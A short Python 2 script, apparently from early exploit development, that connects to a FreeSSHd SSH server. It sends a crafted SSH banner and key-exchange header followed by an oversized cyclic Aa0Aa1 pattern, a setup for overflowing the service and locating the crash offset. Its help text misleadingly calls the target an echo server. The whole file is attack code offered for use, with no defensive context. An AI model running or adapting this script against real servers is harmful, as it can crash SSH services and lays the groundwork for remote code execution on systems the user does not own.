#!/usr/bin/python


# importing necessary modules
import sys
import argparse
import socket

# the structure of the script could be improved, whereas we do all our function calls in main
# and branches out to string/buffer gen and socket creeator 

# parsing commandline arguments
program_description = "Inputs number of bytes to send a random string to echo server that must be under 20,000 bytes"
parser = argparse.ArgumentParser(description=program_description)
parser.add_argument("-s", "--size", required=True, type=int, help="The size of the random alphanumeric string to be outputted")
parser.add_argument("ip", help="The ip address we should send this string via tcp")
parser.add_argument("port", type=int, help="The port the tcp socket server we should connect to")
args = parser.parse_args()


# globals
size = args.size
ip = args.ip
port = args.port
arg_tuple = (ip, port, size)

def string_gen(size):
    # original string setup
    upper_alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    lower_alpha = 'abcdefghijklmnopqrstuvwxyz'
    digits = '0123456789'
    
    # randomnization
    # prepending header for freesshd server
    string = "\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde"
 
    for i in range(len(upper_alpha)):
        for j in range(len(lower_alpha)):
            for k in range(len(digits)):
                string = string + upper_alpha[i] + lower_alpha[j] + digits[k]

    string = string[:size]
    string = string + '\r\n'
    return string
    

def socket_setup((ip, port, size)):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # TCP socket
    s.connect((ip, port))
    print "server says: \n",s.recv(1024)
    send_data = string_gen(size)
    s.send(send_data)
    # making our program run infinitly until we hit ctrl-c
    try: 
#        recv_data = s.recv(1024)    # 1kB of data can be received 
#        print "The tcp echo server said: %s" %recv_data 
        
        while 1:
            pass
    except KeyboardInterrupt:
        print "\n[!] Closing Application..."
        s.close()
        sys.exit(0)


def main((ip, port, size)):
    socket_setup((ip, port, size))
    


# script execution
if __name__ == '__main__':
    main(arg_tuple)         # calls our main function
